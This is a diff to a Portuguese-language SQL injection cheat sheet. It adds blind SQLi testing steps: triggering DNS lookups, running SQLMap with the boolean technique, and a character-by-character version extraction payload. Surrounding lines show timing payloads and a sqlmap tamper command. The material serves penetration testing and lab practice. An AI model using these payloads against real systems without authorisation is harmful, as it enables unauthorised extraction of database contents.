@@ -31,7 +31,10 @@ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(
  ' and substring(@@version,1,1)='[valor-para-testar]
 ```
 ### Burp Suite to exploit Blind SQLi
-<p>Instale a extensão "Copy as Python-Requests" do Burp Suite e use a requisição para realizar a exploração do Blind SQL Injection. 
+<p>Instale a extensão "Copy as Python-Requests" do Burp Suite e use a requisição para realizar a exploração do Blind SQL Injection. Verifique os seguintes comportamentos: 
+- É possível disparar uma consulta DNS? Esse pode ser um indício de que a aplicação é vulnerável a Blind SQL Injection.
+- Use o SQLMap com a técnica ```--technique=B```
+ 
 Script de exemplo para exploração do Blind SQLi com respostas condicionais.</p>
 Burp Lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
 <br></br>
@@ -97,4 +100,12 @@ def tamper(payload, **kwargs):
 ```
 sqlmap -u 'http://[URL]/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
 ```
+#### Sempre verifique os seguintes comportamentos: 
+- É possível disparar uma consulta DNS? Esse pode ser um indício de que a aplicação é vulnerável a Blind SQL Injection.
+- Use o SQLMap com a técnica ```--technique=B```
+- Teste o Blind SQLi usando a extração de caracteres e a extração da versão da base de dados:
+```AND (SELECT SUBSTRING(version(),1,1))='5'```
+
+#### :orange_book: Site para testar códigos SQL: https://www.db-fiddle.com/
+#### :orange_book: Portswigger Cheatsheet para SQL Injection: https://portswigger.net/web-security/sql-injection/cheat-sheet
 
